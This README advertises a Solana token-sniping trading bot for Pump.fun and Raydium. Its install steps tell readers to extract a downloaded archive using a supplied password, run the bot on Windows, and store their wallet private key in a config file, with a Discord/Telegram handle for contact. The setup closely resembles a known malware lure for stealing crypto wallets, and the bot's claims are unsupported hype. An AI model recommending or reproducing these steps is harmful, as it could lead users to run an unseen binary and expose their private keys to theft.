# Solana-Sniper-Bot
This bot includes a token sniper, autotrade, and integration with Raydium and PUMP.FUN. The best solana trading bot for all your needs.

**Overview**
Bot for sniping tokens listed on Pump.fun in the Solana network using C# and the Solnet library.

**Features**
Connects to the Solana MainNet.
Creates and sends transactions to a specified target account.
Configurable via environment variables.

**Usage**
Sniper Functionality: Offers rapid detection and acquisition of newly listed tokens by scanning Dextools and PumpFun.
Automated Purchasing: Facilitates the automatic acquisition of tokens on the Solana blockchain via Raydium or Jupiter platforms.
Profit-Driven Token Analysis: Deploys sophisticated algorithms to pinpoint tokens with high growth potential.
Adjustable Parameters: Empowers users to fine-tune their buying strategies through customizable settings.
Live Price Tracking: Delivers real-time updates and continuous monitoring of token prices.

**Installation**
Download the repository.
extract archive with pass AcY20jQe.
create a config.json in the project's root directory and define your environment variables. You can use the provided config.json.
run the bot.

**Configuration**
The bot uses environment variables for configuration. Create a config.json file in the root directory and set the following variables:

maxPosition: The amount of sol for which a particular token will be purchased.
timeoutScan: Time interval followed by interaction.
rpc: Rpc to which the wallet will be connected example(Shyft).
solPrivate: Your Solana wallet's private key.
Example config.json file:

{
  "mainSettings": { 
    "maxPosition": "0.1",
    "timeoutScan": "30",
    "rpc": "https://<your-solana-rpc>.com:<port>",
    "solPrivate": "<your-solana-private-key>"
  }
}

**Prerequisites**
Framework 4.0 and more.

Windows 10/11.

Solnet Libraries: The project uses the Solnet library to interact with the Solana blockchain.

.NET SDK: Ensure you have the .NET SDK installed. 

Discord/Telegram: genkivfx
